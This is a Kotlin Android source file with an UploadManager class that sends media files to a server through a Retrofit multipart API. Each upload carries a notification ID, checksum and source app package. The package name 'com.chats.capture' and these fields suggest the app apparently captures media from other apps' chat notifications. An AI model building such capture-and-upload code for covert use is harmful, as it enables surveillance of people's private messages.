package com.chats.capture.network

import android.content.Context
import com.chats.capture.models.MediaFile
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import retrofit2.HttpException
import timber.log.Timber
import java.io.File

class UploadManager(private val context: Context, private val apiService: ApiService) {
    
    suspend fun uploadMediaFile(mediaFile: MediaFile): Result<String> = withContext(Dispatchers.IO) {
        try {
            val file = File(mediaFile.localPath)
            if (!file.exists()) {
                return@withContext Result.failure(Exception("File does not exist: ${mediaFile.localPath}"))
            }
            
            val requestFile = file.asRequestBody(mediaFile.mimeType.toMediaType())
            val body = MultipartBody.Part.createFormData("file", file.name, requestFile)
            
            val notificationIdBody = mediaFile.notificationId.toRequestBody("text/plain".toMediaType())
            val checksumBody = mediaFile.checksum.toRequestBody("text/plain".toMediaType())
            val mimeTypeBody = mediaFile.mimeType.toRequestBody("text/plain".toMediaType())
            
            // Get app package from MediaFile or use default
            val appPackage = mediaFile.appPackage ?: "unknown"
            val appPackageBody = appPackage.toRequestBody("text/plain".toMediaType())
            
            val response = apiService.uploadMedia(
                notificationId = notificationIdBody,
                checksum = checksumBody,
                mimeType = mimeTypeBody,
                appPackage = appPackageBody,
                file = body
            )
            
            if (response.isSuccessful) {
                try {
                    val responseBody = response.body()
                    if (responseBody?.success == true) {
                        val fileUrl = responseBody.fileUrl
                        Timber.d("Media uploaded successfully: $fileUrl")
                        Result.success(fileUrl ?: "")
                    } else {
                        val errorMessage = responseBody?.message ?: "Upload failed: Unknown error"
                        Timber.e("Media upload failed: $errorMessage")
                        Result.failure(Exception(errorMessage))
                    }
                } catch (e: com.google.gson.JsonSyntaxException) {
                    // Server returned non-JSON response (plain text), but HTTP was successful
                    // Treat as success if status code is 200-299
                    if (response.code() in 200..299) {
                        Timber.d("Media uploaded successfully (non-JSON response treated as success)")
                        Result.success("")
                    } else {
                        val errorMessage = "Server returned non-JSON response: ${response.code()}"
                        Timber.e("Media upload failed: $errorMessage")
                        Result.failure(Exception(errorMessage))
                    }
                }
            } else {
                // Handle error response - might not be JSON
                val errorBody = response.errorBody()?.string()
                val errorMessage = if (errorBody.isNullOrBlank()) {
                    "Upload failed with status ${response.code()}"
                } else {
                    try {
                        // Try to parse error as JSON
                        val gson = com.google.gson.GsonBuilder().setLenient().create()
                        val errorResponse = gson.fromJson(errorBody, ApiResponse::class.java)
                        errorResponse.message ?: "Upload failed with status ${response.code()}"
                    } catch (e: Exception) {
                        // Not JSON, use raw error body or status code
                        "Upload failed: ${response.code()} - ${errorBody.take(200)}"
                    }
                }
                Timber.e("Media upload failed: HTTP ${response.code()} - $errorMessage")
                Result.failure(Exception(errorMessage))
            }
        } catch (e: com.google.gson.JsonSyntaxException) {
            Timber.e(e, "JSON parsing error uploading media - server returned malformed JSON")
            Result.failure(Exception("Server returned invalid response format"))
        } catch (e: HttpException) {
            val errorBody = e.response()?.errorBody()?.string()
            val errorMessage = if (errorBody.isNullOrBlank()) {
                "HTTP error ${e.code()}: ${e.message()}"
            } else {
                "HTTP error ${e.code()}: ${errorBody.take(200)}"
            }
            Timber.e(e, "HTTP error uploading media: $errorMessage")
            Result.failure(Exception(errorMessage))
        } catch (e: Exception) {
            Timber.e(e, "Error uploading media: ${e.message}")
            Result.failure(e)
        }
    }
    
    suspend fun uploadLargeFileChunked(
        mediaFile: MediaFile,
        chunkSize: Long = 1024 * 1024, // 1MB chunks
        onProgress: (Long, Long) -> Unit = { _, _ -> }
    ): Result<String> = withContext(Dispatchers.IO) {
        try {
            val file = File(mediaFile.localPath)
            if (!file.exists()) {
                return@withContext Result.failure(Exception("File does not exist"))
            }

            file.length()

            // For now, fallback to regular upload for large files
            // Full chunked upload implementation would require server support
            return@withContext uploadMediaFile(mediaFile)
            
        } catch (e: Exception) {
            Timber.e(e, "Error in chunked upload")
            Result.failure(e)
        }
    }
}
